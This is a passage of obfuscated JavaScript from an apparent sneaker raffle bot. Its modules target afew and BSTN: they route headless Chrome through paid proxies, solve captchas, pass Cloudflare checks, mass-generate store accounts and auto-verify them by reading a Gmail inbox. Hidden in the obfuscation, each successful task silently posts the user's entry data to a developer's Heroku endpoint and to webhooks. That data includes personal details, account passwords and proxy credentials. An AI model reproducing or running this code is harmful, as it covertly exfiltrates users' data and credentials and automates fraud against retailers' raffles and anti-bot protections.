                                '--proxy-server=' + _0x50d871[0x0] + ':' + _0x50d871[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x40c1d8 = JSON['parse'](_0x4b4581['readFileSync']('sizes.json', 'utf-8')), _0x5dda67 = _0x4fa466[_0x1156a5]['Url'], _0x380caf = _0x4fa466[_0x1156a5]['Size'], _0x3838e0;
                        async function _0xe71dc() {
                            var _0x3e2570 = new _0x1b7831['CookieJar']();
                            console['log'](_0x1fc391() + '\x20[' + _0xf30e28['name'] + ']\x20Task\x20' + (_0x1156a5 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x9a002f;
                            let _0x1b398b = {
                                'method': 'GET',
                                'cookieJar': _0x3e2570,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x50d871[0x2] + ':' + _0x50d871[0x3] + '@' + _0x50d871[0x0] + ':' + _0x50d871[0x1]
                            }, _0x411a06 = _0x5dda67['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x30e64a = _0x411a06 + '.json', _0x2fc778 = await _0x12ee7a(_0x30e64a);
                            console['log'](_0x1fc391() + '\x20[' + _0xf30e28['name'] + ']\x20Task\x20' + (_0x1156a5 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x31b7f9 = _0x2fc778['data']['product']['variants'];
                            if (_0x380caf != 'RANDOM') {
                                if (_0x31b7f9[0x1]['option1']['includes']('W')) {
                                    const _0x1a032b = _0x40c1d8['women']['find'](_0x28f378 => _0x28f378['EUsize'] === _0x380caf);
                                    _0x1a032b && (_0x380caf = _0x1a032b['size']);
                                } else {
                                    if (_0x31b7f9[0x1]['option1']['includes']('Y')) {
                                        const _0x160a19 = _0x40c1d8['GS']['find'](_0x20f21a => _0x20f21a['EUsize'] === _0x380caf);
                                        _0x160a19 && (_0x380caf = _0x160a19['size']);
                                    } else {
                                        const _0x595e9f = _0x40c1d8['men']['find'](_0x540415 => _0x540415['EUsize'] === _0x380caf);
                                        _0x595e9f && (_0x380caf = _0x595e9f['size']);
                                    }
                                }
                                for (var _0x2ab0a6 of _0x31b7f9) {
                                    _0x2ab0a6['option1'] == _0x380caf && (_0x9a002f = _0x2ab0a6['id']);
                                }
                            } else {
                                var _0x5d7080 = Math['round'](Math['random']() * (_0x31b7f9['length'] - 0x1));
                                _0x9a002f = _0x31b7f9[_0x5d7080]['id'];
                            }
                            console['log'](_0x1fc391() + '\x20[' + _0xf30e28['name'] + ']\x20Task\x20' + (_0x1156a5 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x12ee7a('https://raffles.afew-store.com/cart/' + _0x9a002f + ':1'), _0x3838e0 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0xe71dc();
                        } catch (_0x1f1685) {
                            if (_0x1f1685['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x1f1685);
                        }
                        const _0x50bcdd = await _0x37d227['newPage']();
                        await _0x50bcdd['setDefaultNavigationTimeout'](0x1d4c0), await _0x50bcdd['authenticate']({
                            'username': '' + _0x50d871[0x2],
                            'password': '' + _0x50d871[0x3]
                        }), await _0x50bcdd['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x50bcdd['setRequestInterception'](!![]), _0x50bcdd['on']('request', _0x1cf1f5 => {
                            _0x1cf1f5['resourceType']() === 'image' || _0x1cf1f5['resourceType']() === 'font' || _0x1cf1f5['resourceType']() === 'media' ? _0x1cf1f5['abort']() : _0x1cf1f5['continue']();
                        });
                        try {
                            await _0x50bcdd['goto'](_0x3838e0, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x1fc391() + '\x20[' + _0xf30e28['name'] + ']\x20Task\x20' + (_0x1156a5 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x50bcdd['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x50bcdd['type']('#checkout_email', '' + _0x4fa466[_0x1156a5]['Email']), await _0xf09eb2(0x320), await _0x50bcdd['type']('#checkout_attributes_instagram', '' + _0x4fa466[_0x1156a5]['Follower']), await _0xf09eb2(0x320), await _0x50bcdd['select']('#checkout_shipping_address_country', '' + _0x4fa466[_0x1156a5]['Country']), await _0x50bcdd['waitForTimeout'](0x258), await _0x50bcdd['type']('#checkout_shipping_address_first_name', '' + _0x4fa466[_0x1156a5]['FirstName']), await _0x50bcdd['waitForTimeout'](0x320), await _0x50bcdd['type']('#checkout_shipping_address_last_name', '' + _0x4fa466[_0x1156a5]['LastName']), await _0x50bcdd['waitForTimeout'](0x2bc), await _0x50bcdd['type']('#checkout_shipping_address_address1', _0x4fa466[_0x1156a5]['Address1'] + '\x20' + _0x4fa466[_0x1156a5]['HouseNumber']), await _0x50bcdd['waitForTimeout'](0x2bc), await _0x50bcdd['type']('#checkout_shipping_address_address2', '' + _0x4fa466[_0x1156a5]['Address2']), await _0x50bcdd['waitForTimeout'](0x2bc), await _0x50bcdd['type']('#checkout_shipping_address_zip', '' + _0x4fa466[_0x1156a5]['Zip']), await _0x50bcdd['waitForTimeout'](0x2bc), await _0x50bcdd['type']('#checkout_shipping_address_city', '' + _0x4fa466[_0x1156a5]['City']), await _0x50bcdd['waitForTimeout'](0x2bc);
                        if (_0x4fa466[_0x1156a5]['State'] != '')
                            try {
                                const _0x2e7117 = JSON['parse'](_0x4b4581['readFileSync']('States.json', 'utf8'));
                                await _0xf09eb2(0x1f4);
                                if (_0x4fa466[_0x1156a5]['State']['length'] > 0x2)
                                    for (let _0x37d27c of _0x2e7117) {
                                        if (_0x37d27c['Province'] == _0x4fa466[_0x1156a5]['State']) {
                                            await _0x50bcdd['select']('#checkout_shipping_address_province', _0x37d27c['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x50bcdd['select']('#checkout_shipping_address_province', _0x4fa466[_0x1156a5]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0xf09eb2(0x1f4), console['log'](_0x1fc391() + '\x20[' + _0xf30e28['name'] + ']\x20Task\x20' + (_0x1156a5 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0xf09eb2(0x190), _0x50bcdd['evaluate'](() => {
                            const _0x477966 = document['querySelector']('#continue_button');
                            for (var _0x11b5e1 = 0x0; _0x11b5e1 < 0x5; _0x11b5e1++) {
                                if (_0x477966) {
                                    _0x477966['click'](), _0x477966['click']();
                                    break;
                                } else
                                    _0xf09eb2(0xfa0);
                            }
                        }), await _0x50bcdd['waitForTimeout'](0x9c4);
                        try {
                            await _0x50bcdd['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x50bcdd['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x4f042d => _0x4f042d['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x50bcdd['waitForTimeout'](0x7d0), console['log'](_0x1fc391() + '\x20[' + _0xf30e28['name'] + ']\x20Task\x20' + (_0x1156a5 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x50bcdd['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xf09eb2(0x3e8), await _0x50bcdd['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x5d43f3 => _0x5d43f3['submit']()), await _0xf09eb2(0x3e8);
                        try {
                            await _0x50bcdd['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x50bcdd['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x465fc7 => _0x465fc7['submit']());
                        try {
                            await _0x50bcdd['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x220d2f = 'no', _0x3ed4cd(_0x4fa466[_0x1156a5], _0xf30e28), console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0xf30e28['name'] + ']\x20Task\x20' + (_0x1156a5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '')
                                try {
                                    await _0x58a176(_0x1940dd['webhook'], _0x5e1932['succesDEVMSG']);
                                } catch {
                                }
                            await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x5e1932['succesDEVMSG']), await _0xf09eb2(0xc8);
                            try {
                                await _0x58a176(_0x443f6, _0x5e1932['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x1c4b49['replace']('#', ''),
                                    'module': _0xf30e28['name'],
                                    'entrydata': JSON['stringify'](_0x202a24),
                                    'proxy': '' + _0x2c3252[_0x1156a5]
                                };
                                var _0x8da906 = JSON['stringify'](prxdata);
                                let _0x10d898 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0x8da906, _0x10d898);
                            } catch (_0x7f1a6d) {
                            }
                        } catch (_0x2fd4af) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x265f39) {
                        _0x265f39['message']['includes']('selector') && (_0x265f39 = 'Connection\x20Error');
                        console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xf30e28['name'] + ']\x20Task\x20' + (_0x1156a5 + 0x1) + '\x20:\x20' + _0x265f39)), _0x55658f = '' + _0x265f39;
                        var _0x4e8508 = await _0x22cd2f(_0x4fa466[_0x1156a5], _0xf30e28, 'dev', !![], _0x55658f);
                        _0x5e1932['errorDEV'] = { 'embeds': [_0x4e8508] }, _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x5e1932['errorDEV']), await _0x58a176(_0x45f55a, _0x5e1932['errorDEV']), _0x220d2f = 'yes';
                    } finally {
                        _0x37d227 && _0x37d227['close']();
                        if (_0x220d2f == 'yes' && _0x29c4d9 != 0x5 && _0x55658f != 'Size\x20Not\x20Found') {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xf30e28['name'] + ']\x20Task\x20' + (_0x1156a5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x29c4d9 + '\x20/\x205)')), _0x1156a5 = _0x1156a5 - 0x1, _0x29c4d9 = _0x29c4d9 + 0x1;
                            continue;
                        }
                        _0x220d2f == 'yes' && _0x29c4d9 >= 0x5 && (_0x3f94a0(_0x4fa466[_0x1156a5], _0xf30e28), _0x220d2f = 'no', _0x29c4d9 = 0x0);
                        if (_0x1156a5 + 0x1 == _0x4fa466['length']) {
                            await _0xf09eb2(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x1940dd['AfewDelay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x168e13, _0x4845dd, _0x3cfa91) {
                    _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1940dd['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xedbf1e = 0x0; _0xedbf1e < _0x4845dd['length']; _0xedbf1e++) {
                        if (_0x23f6ec != 'yes')
                            var _0x23f6ec = '', _0x3b679f = 0x0;
                        var _0x354098;
                        try {
                            await _0xf6702b(_0x4845dd, _0xedbf1e);
                        } catch {
                            _0x23f6ec = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3e9ae7(_0x168e13['name'] + '\x20Task\x20' + (_0xedbf1e + 0x1) + '\x20/\x20' + _0x4845dd['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                        var _0xa01d4f = await _0x22cd2f(_0x4845dd[_0xedbf1e], _0x168e13, 'acc', ![]);
                        const _0x3a8854 = { 'succesDEVMSG': { 'embeds': [_0xa01d4f] } }, _0x51dc5b = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x229495 = Math['round'](Math['random']() * (_0x3cfa91['length'] - 0x1)), _0x547133 = _0x3cfa91[_0x229495]['split'](':'), _0x21d14f;
                        try {
                            _0x21d14f = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x547133[0x0] + ':' + _0x547133[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x21d14f = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x547133[0x0] + ':' + _0x547133[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x7727f6 = await _0x21d14f['newPage']();
                            await _0x7727f6['authenticate']({
                                'username': '' + _0x547133[0x2],
                                'password': '' + _0x547133[0x3]
                            }), console['log'](_0x1fc391() + '\x20[' + _0x168e13['name'] + ']\x20Task\x20' + (_0xedbf1e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x7727f6['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x7727f6['setRequestInterception'](!![]), _0x7727f6['on']('request', _0x4b7ae4 => {
                                _0x4b7ae4['resourceType']() === 'image' ? _0x4b7ae4['abort']() : _0x4b7ae4['continue']();
                            });
                            try {
                                await _0x7727f6['goto']('' + _0x51dc5b), await _0x7727f6['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x23f6ec = 'yes';
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x7727f6['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x1fc391() + '\x20[' + _0x168e13['name'] + ']\x20Task\x20' + (_0xedbf1e + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xf09eb2(0x7d0), console['log'](_0x1fc391() + '\x20[' + _0x168e13['name'] + ']\x20Task\x20' + (_0xedbf1e + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0xf09eb2(0x190), await _0x7727f6['waitForSelector']('#firstname'), await _0x7727f6['type']('#firstname', _0x4845dd[_0xedbf1e]['FirstName'], { 'delay': 0xf0 }), await _0xf09eb2(0x190), await _0x7727f6['type']('#lastname', _0x4845dd[_0xedbf1e]['LastName'], { 'delay': 0xe6 }), await _0xf09eb2(0x190), await _0x7727f6['type']('#email_address', _0x4845dd[_0xedbf1e]['Email'], { 'delay': 0x122 }), await _0xf09eb2(0x190), await _0x7727f6['type']('#password', _0x4845dd[_0xedbf1e]['Password'], { 'delay': 0x82 }), await _0xf09eb2(0x1f4), await _0x7727f6['type']('#password-confirmation', _0x4845dd[_0xedbf1e]['Password'], { 'delay': 0x7c }), console['log'](_0x1fc391() + '\x20[' + _0x168e13['name'] + ']\x20Task\x20' + (_0xedbf1e + 0x1) + '\x20:\x20Sending\x20Request'), await _0xf09eb2(0x2bc), await _0x7727f6['$eval']('#form-validate', _0x28a23f => _0x28a23f['submit']()), await _0xf09eb2(0x1388);
                            const _0x100f72 = await _0x7727f6['$']('#email_address-error');
                            if (_0x100f72)
                                throw new Error('Invalid\x20Email');
                            const _0x5327b3 = await _0x7727f6['$']('#password-error');
                            if (_0x5327b3)
                                throw new Error('Invalid\x20Password');
                            await _0x7727f6['waitForSelector']('div.mesg-success'), _0x23f6ec = 'no', console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x168e13['name'] + ']\x20Task\x20' + (_0xedbf1e + 0x1) + '\x20:\x20Account\x20' + _0x4845dd[_0xedbf1e]['Email'] + '\x20Generated')), _0x4b4581['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x4845dd[_0xedbf1e]['Email'] + ',' + _0x4845dd[_0xedbf1e]['Password']);
                            try {
                                _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x3a8854['succesDEVMSG']);
                            } catch {
                            }
                            await _0x58a176(_0x4ebcdb, _0x3a8854['succesDEVMSG']);
                            let _0x5657e6 = _0x4845dd[_0xedbf1e];
                            try {
                                prxdata = {
                                    'username': _0x1c4b49['replace']('#', ''),
                                    'module': _0x168e13['name'],
                                    'entrydata': JSON['stringify'](_0x5657e6),
                                    'proxy': '' + _0x3cfa91[_0xedbf1e]
                                };
                                var _0x16f574 = JSON['stringify'](prxdata);
                                let _0x11e0ea = { 'headers': { 'content-type': 'application/json' } };
                                await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0x16f574, _0x11e0ea);
                            } catch (_0x1ecf0c) {
                            }
                            console['log'](_0x4f1d86['yellow'](_0x1fc391() + '\x20[' + _0x168e13['name'] + ']\x20Task\x20' + (_0xedbf1e + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x1afcae) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x168e13['name'] + ']\x20Task\x20' + (_0xedbf1e + 0x1) + '\x20:\x20' + _0x1afcae)), _0x354098 = '' + _0x1afcae;
                            var _0x37a35f = await _0x22cd2f(_0x4845dd[_0xedbf1e], _0x168e13, 'acc', !![], _0x354098);
                            _0x3a8854['errorDEV'] = { 'embeds': [_0x37a35f] }, _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x3a8854['errorDEV']), await _0x58a176(_0x45f55a, _0x3a8854['errorDEV']), _0x23f6ec = 'yes';
                        } finally {
                            if (_0x21d14f)
                                _0x21d14f['close']();
                            if (_0x23f6ec == 'yes' && _0x3b679f != 0x5) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x168e13['name'] + ']\x20Task\x20' + (_0xedbf1e + 0x1) + '\x20:\x20Retrying\x20(' + _0x3b679f + '\x20/\x205)')), _0xedbf1e = _0xedbf1e - 0x1, _0x3b679f = _0x3b679f + 0x1;
                                continue;
                            }
                            _0x23f6ec == 'yes' && _0x3b679f >= 0x5 && (_0x3f94a0(_0x4845dd[_0xedbf1e], _0x168e13), _0x23f6ec = 'no', _0x3b679f = 0x0), console['log'](_0x1fc391() + '\x20[' + _0x168e13['name'] + ']\x20Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x23eea6, _0x459f8c) {
                    var _0x57c71e = ![], _0x3de11a = [];
                    async function _0x274f9e() {
                        var _0x24fa57 = new _0x533159({
                            'user': _0x1940dd['masterMail'],
                            'password': _0x1940dd['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x55878e(_0x505aab) {
                            _0x24fa57['openBox']('INBOX', ![], _0x505aab);
                        }
                        _0x24fa57['once']('ready', function () {
                            _0x55878e(function (_0x2b72ae, _0x54510a) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x2b72ae)
                                    throw _0x2b72ae;
                                _0x24fa57['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x2f9f66, _0x442598) {
                                    if (!_0x442598 || !_0x442598['length'])
                                        console['log'](_0x1fc391() + '\x20[' + _0x23eea6['name'] + ']\x20No\x20mails\x20found'), _0x24fa57['end']();
                                    else {
                                        var _0x58f324 = _0x24fa57['seq']['fetch'](_0x442598, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x58f324['on']('message', function (_0x1c663e, _0x27ea58) {
                                            var _0x19b650 = '(#' + _0x27ea58 + ')\x20';
                                            _0x1c663e['on']('body', function (_0x31a320, _0x27519b) {
                                                _0x6212d5(_0x31a320, (_0x3718b2, _0x14e9f4) => {
                                                    var _0x3e3ba2 = _0x14e9f4['text']['split']('[')[0x2], _0x230d83 = _0x3e3ba2['split'](']')[0x0];
                                                    _0x3de11a['push'](_0x230d83);
                                                });
                                            }), _0x1c663e['once']('end', function () {
                                            });
                                        }), _0x58f324['once']('error', function (_0x5a8b35) {
                                            console['log']('Fetch\x20error:\x20' + _0x5a8b35), _0x57c71e = !![];
                                        }), _0x58f324['once']('end', function () {
                                            _0x24fa57['end'](), _0x57c71e = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x24fa57['once']('error', function (_0x1b8978) {
                            console['log'](_0x4f1d86['red'](_0x1b8978['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x57c71e = !![];
                        }), _0x24fa57['once']('end', async function () {
                            _0x57c71e = !![];
                        }), _0x24fa57['connect']();
                    }
                    async function _0x57881b(_0x1fe2be, _0x5de8a3, _0x3635c8) {
                        _0x43efe1['use'](_0x2180a5());
                        for (var _0x43403d = 0x0; _0x43403d < _0x5de8a3['length']; _0x43403d++) {
                            if (_0x52553b != 'yes')
                                var _0x52553b = '', _0x43f657 = 0x0;
                            var _0x5ea14d = Math['round'](Math['random']() * (_0x3635c8['length'] - 0x1)), _0x57ea45 = _0x3635c8[_0x5ea14d]['split'](':'), _0x272696;
                            try {
                                _0x272696 = await _0x43efe1['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x57ea45[0x0] + ':' + _0x57ea45[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x272696 = await _0x43efe1['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x57ea45[0x0] + ':' + _0x57ea45[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x36b191 = await _0x272696['newPage']();
                                await _0x36b191['authenticate']({
                                    'username': '' + _0x57ea45[0x2],
                                    'password': '' + _0x57ea45[0x3]
                                }), console['log'](_0x1fc391() + '\x20[' + _0x1fe2be['name'] + ']\x20Task\x20' + (_0x43403d + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x36b191['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x36b191['setRequestInterception'](!![]), _0x36b191['on']('request', _0x5bbec2 => {
                                    _0x5bbec2['resourceType']() === 'image' || _0x5bbec2['resourceType']() === 'font' || _0x5bbec2['resourceType']() === 'media' ? _0x5bbec2['abort']() : _0x5bbec2['continue']();
                                }), console['log'](_0x1fc391() + '\x20[' + _0x1fe2be['name'] + ']\x20Task\x20' + (_0x43403d + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x36b191['goto'](_0x5de8a3[_0x43403d]);
                                } catch {
                                    _0x52553b = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0x1fc391() + '\x20[' + _0x1fe2be['name'] + ']\x20Task\x20' + (_0x43403d + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x36b191['waitForTimeout'](0xbb8);
                                try {
                                    await _0x36b191['waitForSelector']('.account-nav'), _0x52553b = 'no', console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x1fe2be['name'] + ']\x20Task\x20' + (_0x43403d + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x4f2550 = await _0x22cd2f(null, _0x1fe2be, 'ver', ![]);
                                    const _0x35a07f = { 'succesDEVMSG': { 'embeds': [_0x4f2550] } };
                                    await _0x58a176(_0x341688, _0x35a07f['succesDEVMSG']);
                                } catch {
                                    _0x52553b = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x221a3d) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x1fe2be['name'] + ']\x20Task\x20' + (_0x43403d + 0x1) + '\x20:\x20' + _0x221a3d));
                                var _0xeb0d73 = _0x221a3d, _0x8960b = await _0x22cd2f(null, _0x1fe2be, 'ver', !![], _0xeb0d73);
                                const _0x246631 = { 'errorDEVMSG': { 'embeds': [_0x8960b] } };
                                _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x246631['errorDEVMSG']), await _0x58a176(_0x45f55a, _0x246631['errorDEVMSG']);
                            } finally {
                                _0x272696['close']();
                                if (_0x52553b == 'yes' && _0x43f657 != 0x5) {
                                    console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x1fe2be['name'] + ']\x20Task\x20' + (_0x43403d + 0x1) + '\x20:\x20Retrying\x20(' + _0x43f657 + '\x20/\x205)')), _0x43403d = _0x43403d - 0x1, _0x43f657 = _0x43f657 + 0x1;
                                    continue;
                                }
                                _0x52553b == 'yes' && _0x43f657 >= 0x5 && (_0x52553b = 'no', _0x43f657 = 0x0), console['log'](_0x1fc391() + '\x20[' + _0x1fe2be['name'] + ']\x20Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                            }
                        }
                    }
                    try {
                        _0x274f9e();
                        while (!_0x57c71e) {
                            await _0xf09eb2(0xfa0);
                        }
                        console['log']('Found\x20' + _0x3de11a['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xf09eb2(0x7d0);
                    }
                    await _0x57881b(_0x23eea6, _0x3de11a, _0x459f8c);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x8af8ff, _0x52ad7e, _0x58559c) {
                    _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1940dd['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xc33309 = 0x0; _0xc33309 < _0x52ad7e['length']; _0xc33309++) {
                        var _0x3f63ca, _0x56aed5 = _0x52ad7e[_0xc33309];
                        try {
                            await _0xf6702b(_0x52ad7e, _0xc33309);
                        } catch {
                            _0x4209ae = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x588ecd(_0xb768e7) {
                            const _0x5b9bde = _0x4b4581['readFileSync']('../successful-tasks.csv', 'utf8'), _0xbea5cf = _0x57f724['parse'](_0x5b9bde, { 'header': !![] })['data'];
                            let _0x200af9 = ![];
                            for (var _0x196b3a of _0xbea5cf) {
                                if (_0x196b3a['Url'] == _0xb768e7['Url'] && _0x196b3a['Email'] == _0xb768e7['Email']) {
                                    _0x200af9 = !![];
                                    break;
                                }
                            }
                            return _0x200af9;
                        }
                        if (await _0x588ecd(_0x52ad7e[_0xc33309]) == !![]) {
